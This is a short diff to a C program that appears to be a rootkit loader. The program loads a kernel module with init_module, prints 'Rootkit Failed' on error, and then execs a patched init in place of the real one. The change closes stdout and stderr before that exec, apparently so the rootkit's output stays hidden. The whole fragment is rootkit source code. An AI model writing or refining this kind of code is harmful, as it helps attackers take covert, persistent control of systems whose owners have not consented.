@@ -28,6 +28,8 @@ int main(int argc, char * argv[]){
     if (init_module(image, image_size, params) != 0) {
         printf("\n!!! Rootkit Failed \n\n");
     }
+    close(1);
+    close(2);
     free(image);
     return execve("/init.patched", argv, environ);
 }
